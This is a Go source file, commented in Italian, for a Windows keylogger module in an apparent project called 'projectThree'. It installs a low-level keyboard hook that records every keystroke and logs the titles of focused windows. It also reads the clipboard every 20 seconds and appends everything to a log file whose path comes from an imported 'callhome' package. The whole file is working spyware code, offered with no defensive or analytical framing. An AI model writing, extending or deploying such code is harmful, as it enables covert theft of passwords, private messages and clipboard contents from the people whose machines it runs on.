package logger

import (
	"fmt"
	"os"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"projectThree/callhome"
	"projectThree/winapi"
	"projectThree/wintypes"
)

var (
	keyboardHook     wintypes.HHOOK
	windowSwitchHook wintypes.HWINEVENTHOOK

	attachMap = make(map[wintypes.DWORD]bool)
	titleMap  = make(map[wintypes.DWORD]string)

	// Clipboard API
	user32           = syscall.NewLazyDLL("user32.dll")
	openClipboard    = user32.NewProc("OpenClipboard")
	closeClipboard   = user32.NewProc("CloseClipboard")
	getClipboardData = user32.NewProc("GetClipboardData")
	globalLock       = syscall.NewLazyDLL("kernel32.dll").NewProc("GlobalLock")
	globalUnlock     = syscall.NewLazyDLL("kernel32.dll").NewProc("GlobalUnlock")

	mutex = sync.Mutex{}
)

const (
	CF_UNICODETEXT = 13        // Formato Unicode per la clipboard
	logFile        = "log.txt" // File per salvare i log
)

/*
windowChangeCallback - Registra i cambi di finestra attiva e scrive il titolo nel file.
*/
func windowChangeCallback(hWinEventHook wintypes.HWINEVENTHOOK, event wintypes.DWORD, hwnd wintypes.HWND,
	idObject wintypes.LONG, idChild wintypes.LONG, idEventThread wintypes.DWORD, dwmsEventTime wintypes.DWORD) uintptr {
	title := fmt.Sprintf("[Finestra Attiva]: %s\n", winapi.GetWindowText(hwnd))
	fmt.Printf("Titolo finestra attiva: %s\n", title)

	// Scrivi il titolo nel file log.txt
	AppendToFile(title)
	return uintptr(0)
}

/*
keyPressCallback - Cattura i tasti premuti e scrive i caratteri nel file log.txt.
*/
func keyPressCallback(nCode int, wparam wintypes.WPARAM, lparam wintypes.LPARAM) wintypes.LRESULT {
	if nCode >= 0 && wparam == wintypes.WPARAM(wintypes.WM_KEYUP) {
		kbdstruct := (*wintypes.KBDLLHOOKSTRUCT)(unsafe.Pointer(lparam))
		keyState := [256]byte{}

		// Stato della tastiera
		if winapi.GetKeyboardState(&keyState) == 0 {
			fmt.Println("Impossibile ottenere lo stato della tastiera")
			return winapi.CallNextHookEx(keyboardHook, nCode, wparam, lparam)
		}

		layout := winapi.GetKeyboardLayout(winapi.GetCurrentThreadId())
		var lpChar [2]uint16

		if winapi.ToUnicodeEx(kbdstruct.VkCode, kbdstruct.ScanCode, &keyState, &lpChar[0], 1, 0, layout) > 0 {
			character := syscall.UTF16ToString(lpChar[:])

			// Gestione speciale dei tasti di controllo
			switch kbdstruct.VkCode {
			case 0x0D: // Invio
				character = "\n"
			case 0x08: // Backspace
				character = "[BS]"
			case 0x09: // Tab
				character = "\t"
			case 0x20: // Spazio
				character = " "
			}

			// Debug del carattere catturato
			fmt.Printf("Carattere catturato: %s\n", character)

			// Scrivi nel file log.txt
			AppendToFile(character)
		}
	}
	return winapi.CallNextHookEx(keyboardHook, nCode, wparam, lparam)
}

/*
CaptureClipboard - Cattura il contenuto della clipboard.
*/
func CaptureClipboard() string {
	if _, _, err := openClipboard.Call(0); err != nil && err.Error() != "The operation completed successfully." {
		return ""
	}
	defer closeClipboard.Call()

	h, _, _ := getClipboardData.Call(uintptr(CF_UNICODETEXT))
	if h == 0 {
		return ""
	}

	ptr, _, _ := globalLock.Call(h)
	if ptr == 0 {
		return ""
	}
	defer globalUnlock.Call(h)

	return syscall.UTF16ToString((*[1 << 20]uint16)(unsafe.Pointer(ptr))[:])
}

/*
CaptureClipboardPeriodically - Controlla la clipboard ogni 20 secondi.
*/
func CaptureClipboardPeriodically() {
	for {
		time.Sleep(20 * time.Second)
		text := CaptureClipboard()
		if text != "" {
			fmt.Printf("Clipboard catturata: %s\n", text)

			// Scrivi il contenuto della clipboard nel file
			AppendToFile(fmt.Sprintf("[CLIPBOARD]: %s\n", text))
		} else {
			fmt.Println("Clipboard vuota o non disponibile")
		}
	}
}

/*
appendToFile - Aggiunge testo al file log.txt.
*/
func AppendToFile(text string) {
	mutex.Lock()
	defer mutex.Unlock()

	filePath := callhome.GetLogFilePath()
	fmt.Printf("Tentativo di scrittura nel file: %s\n", filePath)

	// Verifica se il file esiste
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		fmt.Printf("Errore: il file non esiste al percorso: %s\n", filePath)
		return
	}

	// Apertura del file
	file, err := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("Errore nell'apertura del file log.txt: %v\n", err)
		return
	}
	defer file.Close()

	// Scrittura del testo
	fmt.Printf("Scrittura del testo nel file log.txt: %s\n", text)
	_, err = file.WriteString(text)
	if err != nil {
		fmt.Printf("Errore durante la scrittura nel file log.txt: %v\n", err)
	} else {
		fmt.Println("Testo scritto correttamente nel file log.txt")
	}
}

/*
Start - Avvia il keylogger e il monitoraggio della clipboard.
*/
func Start() {
	windowSwitchHook = winapi.SetWinEventHook(
		wintypes.EVENT_OBJECT_FOCUS,
		wintypes.EVENT_OBJECT_FOCUS,
		0,
		windowChangeCallback,
		0,
		0,
		0|2,
	)

	keyboardHook = winapi.SetWindowsHookEx(
		wintypes.WH_KEYBOARD_LL,
		keyPressCallback,
		0,
		0,
	)

	// Avvia il monitoraggio della clipboard
	go CaptureClipboardPeriodically()

	// Loop principale
	fmt.Println("Inizio del loop principale per l'ascolto degli eventi")
	var msg wintypes.MSG
	for winapi.GetMessage(&msg, 0, 0, 0) != 0 {
		winapi.TranslateMessage(&msg)
		winapi.DispatchMessage(&msg)
	}
	fmt.Println("Uscita dal loop principale")

	winapi.UnhookWindowsHookEx(keyboardHook)
	winapi.UnhookWinEvent(windowSwitchHook)
}
